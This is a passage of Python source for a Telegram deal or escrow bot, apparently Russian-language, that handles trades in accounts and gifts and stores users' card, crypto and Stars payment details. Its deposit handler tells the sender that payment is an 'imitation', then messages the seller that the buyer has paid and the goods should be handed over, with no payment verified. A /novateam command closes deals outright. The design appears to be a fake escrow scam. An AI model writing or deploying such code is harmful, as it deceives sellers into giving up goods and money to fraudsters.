    requisites = message.text.strip()
    if not requisites:
        await message.answer("⚠️ Реквизиты не могут быть пустыми. Введите данные.")
        return
    await state.update_data(seller_req=requisites)
    data = await state.get_data()
    deal_id = str(uuid.uuid4())[:8]
    seller_id = message.from_user.id
    seller_username = message.from_user.username or "NoUsername"
    created_at = datetime.now().isoformat()

    try:
        cur.execute("""
            INSERT INTO deals (deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (deal_id, seller_id, None, data['deal_type'], data['description'], data['amount'], data['currency'], requisites, None, 'waiting', seller_username, None, created_at))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка создания сделки: {e}")
        await message.answer("🚫 Ошибка при создании сделки. Попробуйте позже.")
        await state.clear()
        return

    user_id = message.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    text = get_text('deal_created', lang).format(
        deal_id=deal_id,
        deal_type=data['deal_type'],
        description=data['description'],
        amount=data['amount'],
        currency=data['currency'],
        requisites=requisites,
        bot_username=BOT_USERNAME
    )
    await send_with_photo(message.chat.id, text)
    await state.clear()

# ==================================================
# FSM ДЛЯ СОЗДАНИЯ СДЕЛКИ (ПОКУПАТЕЛЬ)
# ==================================================
@dp.callback_query(F.data == "buyer_role")
async def buyer_role(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('buyer_role', lang), reply_markup=get_deal_types(lang))
    await state.set_state(DealStates.buyer_type)
    await callback.answer()

@dp.callback_query(DealStates.buyer_type, F.data.startswith("deal_type_"))
async def buyer_type_chosen(callback: CallbackQuery, state: FSMContext):
    deal_type = callback.data.split("_")[2]
    await state.update_data(deal_type=deal_type)
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('deal_type_account' if deal_type == 'account' else 'deal_type_gift', lang))
    await state.set_state(DealStates.buyer_description)
    await callback.answer()

@dp.message(DealStates.buyer_description)
async def buyer_description(message: Message, state: FSMContext):
    await state.update_data(description=message.text)
    user_id = message.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(message.chat.id, get_text('payment_method', lang), reply_markup=get_payment_methods(lang))
    await state.set_state(DealStates.buyer_payment_method)

@dp.callback_query(DealStates.buyer_payment_method, F.data.startswith("payment_"))
async def buyer_payment_method(callback: CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('amount', lang, currency=currency.upper()))
    await state.set_state(DealStates.buyer_amount)
    await callback.answer()

@dp.message(DealStates.buyer_amount)
async def buyer_amount(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("⚠️ Введите целое число.")
        return
    amount = int(message.text)
    if amount <= 0:
        await message.answer("⚠️ Сумма должна быть больше нуля.")
        return
    await state.update_data(amount=amount)
    await send_with_photo(message.chat.id, "Введите @username продавца.\n\nНапример: @seller")
    await state.set_state(DealStates.buyer_seller_username)

@dp.message(DealStates.buyer_seller_username)
async def buyer_seller_username(message: Message, state: FSMContext):
    seller_username = message.text.strip()
    if not seller_username.startswith("@"):
        seller_username = "@" + seller_username
    await state.update_data(seller_username=seller_username)
    data = await state.get_data()
    deal_id = str(uuid.uuid4())[:8]
    buyer_id = message.from_user.id
    buyer_username = message.from_user.username or "NoUsername"
    created_at = datetime.now().isoformat()

    try:
        cur.execute("""
            INSERT INTO deals (deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (deal_id, None, buyer_id, data['deal_type'], data['description'], data['amount'], data['currency'], None, None, 'waiting', seller_username, buyer_username, created_at))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка создания сделки покупателем: {e}")
        await message.answer("🚫 Ошибка при создании сделки. Попробуйте позже.")
        await state.clear()
        return

    user_id = message.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    text = get_text('deal_created_buyer', lang).format(
        deal_id=deal_id,
        deal_type=data['deal_type'],
        description=data['description'],
        amount=data['amount'],
        currency=data['currency'],
        seller_username=seller_username,
        bot_username=BOT_USERNAME
    )
    await send_with_photo(message.chat.id, text)

    # Уведомляем продавца (если он существует в БД)
    cur.execute("SELECT user_id FROM users WHERE username=?", (seller_username[1:],))
    row = cur.fetchone()
    if row:
        seller_id = row[0]
        await bot.send_message(seller_id, f"📦 Покупатель @{buyer_username} создал сделку #{deal_id}. Перейдите по ссылке для подтверждения:\nhttps://t.me/{BOT_USERNAME}?start=deal_{deal_id}")

    await state.clear()

# ==================================================
# ПОДТВЕРЖДЕНИЕ ПРОДАВЦА
# ==================================================
@dp.callback_query(F.data.startswith("confirm_seller_"))
async def confirm_seller(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    user_id = callback.from_user.id
    username = callback.from_user.username
    try:
        cur.execute("SELECT seller_id, buyer_id, status, seller_username FROM deals WHERE deal_id=?", (deal_id,))
        deal = cur.fetchone()
        if not deal:
            await callback.answer("🚫 Сделка не найдена.")
            return
        seller_id, buyer_id, status, seller_username = deal
        # Проверяем, является ли пользователь продавцом (учитываем, что seller_id мог быть None)
        if user_id != seller_id:
            # Если seller_id None, но это тот же username, что и записан, разрешаем
            if seller_id is None and seller_username == username:
                # назначаем его продавцом
                cur.execute("UPDATE deals SET seller_id=? WHERE deal_id=?", (user_id, deal_id))
                conn.commit()
            else:
                await callback.answer("⛔ Вы не продавец в этой сделке.")
                return
        if status != "waiting":
            await callback.answer("⛔ Сделка уже не в статусе ожидания.")
            return
        cur.execute("UPDATE deals SET status='active' WHERE deal_id=?", (deal_id,))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка подтверждения сделки: {e}")
        await callback.answer("🚫 Ошибка.")
        return

    # Уведомляем покупателя
    try:
        cur.execute("SELECT buyer_id, buyer_username, deal_type, description, amount, currency, seller_req FROM deals WHERE deal_id=?", (deal_id,))
        buyer_id, buyer_username, deal_type, description, amount, currency, seller_req = cur.fetchone()
        if buyer_id:
            cur.execute("SELECT lang FROM users WHERE user_id=?", (buyer_id,))
            row = cur.fetchone()
            lang = row[0] if row else 'ru'
            await bot.send_message(buyer_id, get_text('buyer_notify', lang).format(
                deal_id=deal_id,
                deal_type=deal_type,
                description=description,
                amount=amount,
                currency=currency,
                seller_req=seller_req if seller_req else "Не указаны"
            ), parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка уведомления покупателя: {e}")

    # Язык продавца
    cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
    row = cur.fetchone()
    seller_lang = row[0] if row else 'ru'

    await callback.message.edit_text(get_text('deal_confirm_seller', seller_lang).format(deal_id=deal_id) if 'deal_confirm_seller' in TEXTS[seller_lang] else "✅ Вы подтвердили участие. Ожидайте оплаты от покупателя.", parse_mode="HTML")
    await callback.answer()

# ==================================================
# ОБРАБОТЧИК /novateam (работает без упоминаний)
# ==================================================
@dp.message(Command("novateam"))
async def novateam(message: Message):
    user_id = message.from_user.id
    args = message.text.split()
    
    if len(args) > 1:
        deal_id = args[1]
        cur.execute("SELECT deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type FROM deals WHERE deal_id=? AND (seller_id=? OR buyer_id=?) AND status='active'", (deal_id, user_id, user_id))
        deal = cur.fetchone()
        if not deal:
            await message.answer("🚫 Активная сделка с таким ID не найдена или вы не участник.")
            return
    else:
        cur.execute("SELECT deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type FROM deals WHERE (seller_id=? OR buyer_id=?) AND status='active'", (user_id, user_id))
        deal = cur.fetchone()
        if not deal:
            await message.answer("🚫 Активная сделка не найдена. Если у вас несколько сделок, укажите ID: /novateam <ID>")
            return
    (deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type) = deal

    try:
        cur.execute("UPDATE deals SET status='completed' WHERE deal_id=?", (deal_id,))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка завершения сделки: {e}")
        await message.answer("🚫 Ошибка при завершении сделки.")
        return

    cur.execute("SELECT lang FROM users WHERE user_id=?", (seller_id,))
    row = cur.fetchone()
    seller_lang = row[0] if row else 'ru'
    cur.execute("SELECT lang FROM users WHERE user_id=?", (buyer_id,))
    row = cur.fetchone()
    buyer_lang = row[0] if row else 'ru'

    if user_id == seller_id:
        text = get_text('novateam_seller', seller_lang).format(
            deal_id=deal_id,
            buyer=buyer_username,
            amount=amount,
            currency=currency,
            description=description
        )
        await message.answer(text)  # parse_mode не нужен, т.к. текст без HTML
        if buyer_id:
            buyer_text = get_text('novateam_buyer', buyer_lang).format(deal_id=deal_id)
            await bot.send_message(buyer_id, buyer_text)
    elif user_id == buyer_id:
        text = get_text('novateam_buyer', buyer_lang).format(deal_id=deal_id)
        await message.answer(text)
        if seller_id:
            seller_text = get_text('novateam_seller', seller_lang).format(
                deal_id=deal_id,
                buyer=buyer_username,
                amount=amount,
                currency=currency,
                description=description
            )
            await bot.send_message(seller_id, seller_text)
    else:
        await message.answer("🚫 Вы не участник этой сделки.")

# ==================================================
# ДРУГИЕ ОБРАБОТЧИКИ
# ==================================================
@dp.callback_query(F.data == "my_deals")
async def my_deals(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT deal_id, deal_type, description, amount, currency, status FROM deals WHERE seller_id=? OR buyer_id=?", (user_id, user_id))
        deals = cur.fetchall()
        if not deals:
            await callback.message.answer(get_text('my_deals_empty', 'ru'))
            await callback.answer()
            return
        deals_text = ""
        for d in deals:
            desc = d[2][:30] + "..." if len(d[2]) > 30 else d[2]
            deals_text += f"#{d[0]} | {d[1]} | {desc} | {d[3]} {d[4]} | {d[5]}\n"
        await send_with_photo(callback.message.chat.id, get_text('my_deals_list', 'ru').format(deals=deals_text))
    except Exception as e:
        logging.error(f"Ошибка my_deals: {e}")
        await callback.message.answer("🚫 Ошибка при загрузке сделок.")
    await callback.answer()

@dp.callback_query(F.data == "requisites")
async def requisites_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('requisites_menu', lang), reply_markup=get_requisites_menu(lang))
    await callback.answer()

@dp.callback_query(F.data.startswith("req_"))
async def requisites_edit(callback: CallbackQuery, state: FSMContext):
    req_type = callback.data.split("_")[1]
    await state.update_data(req_type=req_type)
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    if req_type == "card":
        text = get_text('requisites_card', lang)
    elif req_type == "crypto":
        text = get_text('requisites_crypto', lang)
    else:
        text = get_text('requisites_stars', lang)
    await send_with_photo(callback.message.chat.id, text)
    await state.set_state(DealStates.profile_requisites_input)
    await callback.answer()

@dp.message(DealStates.profile_requisites_input)
async def save_requisites(message: Message, state: FSMContext):
    data = await state.get_data()
    req_type = data['req_type']
    value = message.text.strip()
    if not value:
        await message.answer("⚠️ Реквизиты не могут быть пустыми. Введите данные.")
        return
    user_id = message.from_user.id
    try:
        if req_type == "card":
            cur.execute("UPDATE users SET card=? WHERE user_id=?", (value, user_id))
        elif req_type == "crypto":
            cur.execute("UPDATE users SET crypto=? WHERE user_id=?", (value, user_id))
        else:
            cur.execute("UPDATE users SET stars_username=? WHERE user_id=?", (value, user_id))
        conn.commit()
        # Получаем язык пользователя
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
        await message.answer(get_text('requisites_saved', lang))
    except Exception as e:
        logging.error(f"Ошибка сохранения реквизитов: {e}")
        await message.answer("🚫 Ошибка сохранения.")
    await state.clear()

@dp.callback_query(F.data == "lang")
async def lang_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"))
    builder.row(InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en"))
    builder.row(InlineKeyboardButton(text="🇨🇳 中文", callback_data="lang_zh"))
    builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
    await send_with_photo(callback.message.chat.id, get_text('lang_menu', lang), reply_markup=builder.as_markup())
    await callback.answer()

@dp.callback_query(F.data.startswith("lang_"))
async def set_lang(callback: CallbackQuery):
    lang = callback.data.split("_")[1]
    user_id = callback.from_user.id
    try:
        cur.execute("UPDATE users SET lang=? WHERE user_id=?", (lang, user_id))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка смены языка: {e}")
        await callback.message.answer("🚫 Ошибка.")
        await callback.answer()
        return
    await callback.message.answer(get_text('lang_set', lang).format(lang=lang))
    await callback.answer()

@dp.callback_query(F.data == "support")
async def support(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('support', lang))
    await callback.answer()

@dp.callback_query(F.data == "verify")
async def verify(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('verify', lang))
    await callback.answer()

@dp.callback_query(F.data == "referral")
async def referral(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
        cur.execute("SELECT ref_count FROM users WHERE user_id=?", (user_id,))
        ref_count = cur.fetchone()[0]
        await send_with_photo(callback.message.chat.id, get_text('referral', lang).format(bot_username=BOT_USERNAME, user_id=user_id, ref_count=ref_count))
    except Exception as e:
        logging.error(f"Ошибка рефералов: {e}")
        await callback.message.answer("🚫 Ошибка.")
    await callback.answer()

@dp.callback_query(F.data == "about")
async def about(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('about', lang))
    await callback.answer()

# ==================================================
# ОБРАБОТЧИКИ ДЛЯ FUNDS
# ==================================================
@dp.callback_query(F.data == "funds_deposit")
async def funds_deposit(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('funds_deposit', lang))
    await state.set_state(DealStates.funds_deposit)
    await callback.answer()

@dp.message(DealStates.funds_deposit)
async def funds_deposit_handle(message: Message, state: FSMContext):
    deal_id = message.text.strip()
    try:
        cur.execute("SELECT seller_id, buyer_id, status FROM deals WHERE deal_id=?", (deal_id,))
        row = cur.fetchone()
        if not row:
            await message.answer(get_text('funds_deposit_error', 'ru'))
            return
        seller_id, buyer_id, status = row
        if message.from_user.id not in (seller_id, buyer_id):
            await message.answer("🚫 Вы не участник этой сделки.")
            return
        if status != 'active':
            await message.answer("🚫 Сделка не активна или уже завершена.")
            return
        await message.answer("✅ Оплата по сделке принята (имитация). Ожидайте подтверждения.")
        if message.from_user.id == seller_id:
            pass
        else:
            await bot.send_message(seller_id, f"💳 Покупатель оплатил сделку #{deal_id}. Передайте товар.")
    except Exception as e:
        logging.error(f"Ошибка обработки депозита: {e}")
        await message.answer("🚫 Ошибка при обработке.")
    await state.clear()

@dp.callback_query(F.data == "funds_withdraw")
async def funds_withdraw(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('funds_withdraw', lang))
    await callback.answer()

# ==================================================
# ЗАПУСК БОТА И ВЕБ-СЕРВЕРА (С АПТАЙМ-РОБОТОМ И ОЧИСТКОЙ ВЕБХУКА)
# ==================================================
async def on_startup(app):
    logging.info("Bot started (web server up)")

async def on_shutdown(app):
    try:
        conn.close()
        logging.info("Database connection closed.")
    except Exception as e:
        logging.error(f"Error closing DB: {e}")
    logging.info("Bot stopped (web server down)")

async def handle(request):
    return web.Response(text="Bot is alive")

async def main():
    # Создаём веб-приложение
    app = web.Application()
    app.router.add_get("/", handle)
    app.on_startup.append(on_startup)
    app.on_shutdown.append(on_shutdown)

    # Запускаем веб-сервер через AppRunner (не создаёт новый цикл)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host="0.0.0.0", port=PORT)
    await site.start()
    logging.info(f"Web server started on port {PORT}")

    # === ОЧИСТКА СТАРЫХ ВЕБХУКОВ/ПОЛЛИНГОВ ===
    await bot.delete_webhook(drop_pending_updates=True)
    logging.info("Old webhook/polling cleared. Starting fresh.")
    # ========================================

    # ===== АПТАЙМ-РОБОТ: бесконечный цикл с перезапуском при сбое =====
    while True:
        try:
            logging.info("Starting bot polling...")
            await dp.start_polling(bot)
        except Exception as e:
            logging.error(f"Polling crashed: {e}. Restarting in 5 seconds...")
            await asyncio.sleep(5)
            continue  # перезапускаем цикл
        else:
            # Если поллинг завершился нормально (например, вручную) — выходим
            logging.info("Polling stopped gracefully. Shutting down...")
            break
    # =====================================================================

    await runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
